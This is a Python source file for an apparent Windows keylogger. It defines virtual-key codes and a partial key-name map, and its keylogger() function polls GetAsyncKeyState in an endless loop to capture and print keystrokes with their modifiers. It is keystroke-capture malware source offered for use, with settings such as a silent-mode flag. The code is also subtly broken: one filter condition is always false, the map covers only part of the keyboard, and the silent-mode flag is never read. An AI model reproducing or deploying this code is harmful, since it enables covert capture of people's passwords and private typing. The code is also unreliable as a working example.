import win32api
import time
import sys
import platform

# Visual key value
VK_LBUTTON = 0x01 # mouse
VK_RBUTTON = 0x02 # mouse
VK_CANCEL = 0x03
VK_MBUTTON = 0x04
VK_BACK = 0x08
VK_TAB = 0x09
VK_CLEAR = 0x0C
VK_RETURN = 0X0D # enter
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12 # alt key
VK_CAPITAL = 0x14 # caps lock key
VK_ESCAPE = 0x1B # esc key
VK_SPACE = 0x20
VK_PRIOR = 0x21 # page up key
VK_NEXT = 0x22 # page down key
VK_HOME = 0x24
VK_LEFT = 0x25
VK_UP = 0x26
VK_RIGHT = 0x27
VK_DOWN = 0x28
VK_SELECT = 0x29 # select key
VK_PRINT = 0x2A
VK_EXECUTE = 0x2B
VK_SNAPSHOT = 0x2C
VK_INSERT = 0x2D # ins key
VK_DELETE = 0x2E
VK_HELP = 0x2F
VK_0 = 0x30
VK_1 = 0x31
VK_2 = 0x32
VK_3 = 0x33
VK_4 = 0x34
VK_5 = 0x35
VK_6 = 0x36
VK_7 = 0x37
VK_8 = 0x38
VK_9 = 0x39
VK_A = 0x41
VK_B = 0x42
VK_C = 0x43
VK_D = 0x44
VK_E = 0x45
VK_F = 0x46
VK_G = 0x47
VK_H = 0x48
VK_I = 0x49
VK_J = 0x4A
VK_K = 0x4B
VK_L = 0x4C
VK_M = 0x4D
VK_N = 0x4E
VK_O = 0x4F
VK_P = 0x50
VK_Q = 0x51
VK_R = 0x52
VK_S = 0x53
VK_T = 0x54
VK_U = 0x55
VK_V = 0x56
VK_W = 0x57
VK_X = 0x58
VK_Y = 0x59
VK_Z = 0x5A
VK_NUMPAD0 = 0x60
VK_NUMPAD1 = 0x61
VK_NUMPAD2 = 0x62
VK_NUMPAD3 = 0x63
VK_NUMPAD4 = 0x64
VK_NUMPAD5 = 0x65
VK_NUMPAD6 = 0x66
VK_NUMPAD7 = 0x67
VK_NUMPAD8 = 0x68
VK_NUMPAD9 = 0x69
VK_SEPARATOR = 0x6C
VK_SUBTRACT = 0x6D
VK_DECIMAL = 0x6E
VK_DIVIDE = 0x6F
VK_F1 = 0x70
VK_F2 = 0x71
VK_F3 = 0x72
VK_F4 = 0x73
VK_F5 = 0x74
VK_F6 = 0x75
VK_F7 = 0x76
VK_F8 = 0x77
VK_F9 = 0x78
VK_F10 = 0x79
VK_F11 = 0x7A
VK_F12 = 0x7B
VK_NUMLOCK = 0x90
VK_SCROLL = 0x91

#keymap
keymap = {
    VK_CANCEL : 'Cancel',
    VK_BACK : 'Backspace',
    VK_TAB : 'Tab',
    VK_CLEAR : 'Clear',
    VK_RETURN : 'Enter',
    VK_SHIFT : 'Shift',
    VK_CONTROL : 'Ctrl',
    VK_MENU : 'Alt',
    VK_CAPITAL : 'CapsLock',
    VK_PRINT : 'Print',
    VK_EXECUTE : 'EXecute',
    VK_0 : '0',
    VK_1 : '1',
    VK_2 : '2',
    VK_3 : '3',
    VK_4 : '4',
    VK_5 : '5',
    VK_6 : '6',
    VK_7 : '7',
    VK_8 : '8',
    VK_9 : '9',
    VK_A : 'a',
    VK_B : 'b',
    VK_C : 'c',
    VK_D : 'd',
    VK_E : 'e',
    VK_F : 'f',
    VK_G : 'g',
    VK_H : 'h'
}

### change parameter here ###
SilentMode = False
MAX_KEYLOGGER_BUF = 1024
#############################

if platform.system() == "Windows":
    def keylogger():
        result = ''
        while True:
            name = ''
            for code in range(8, 256):
                if code in [VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL, VK_NUMLOCK]:
                    continue
                status = win32api.GetAsyncKeyState(code)
                if status and 1 != 1: continue
                character = keymap.get(code)
                CtrlKey = win32api.GetKeyState(VK_CONTROL) < 0
                AltKey = win32api.GetKeyState(VK_MENU) < 0
                ShiftKey = win32api.GetKeyState(VK_SHIFT) < 0
                CapsLock = win32api.GetKeyState(VK_CAPITAL) and 1 == 1
                NumLock = win32api.GetKeyState(VK_NUMLOCK) and 1 == 1
                
                Modifer = []
                if CtrlKey: Modifer.append('Control')
                if AltKey: Modifer.append('Alt')
                if ShiftKey: Modifer.append('Shift')
                character = keymap.get(code)
                if character is None:
                    continue
                name = '-'.join(Modifer + [character])
                if VK_A <= code <= VK_Z and not Modifer and CapsLock:
                    name = character.upper()
                if VK_NUMPAD0 <= code <= VK_DIVIDE and NumLock and keymap.get('NumLock-' + name):
                    name = keymap.get('NumLock-' + name)
                elif keymap.get(name):
                    name = keymap.get(name)
                if len(name) > 1 or ord(name) > 255:
                    name = '[' + name + ']'
                result += name
            if len(result) > MAX_KEYLOGGER_BUF:
                result = result[-MAX_KEYLOGGER_BUF:]
            if result:
                print(result)
            result = ''
            time.sleep(0.1)
            
keylogger()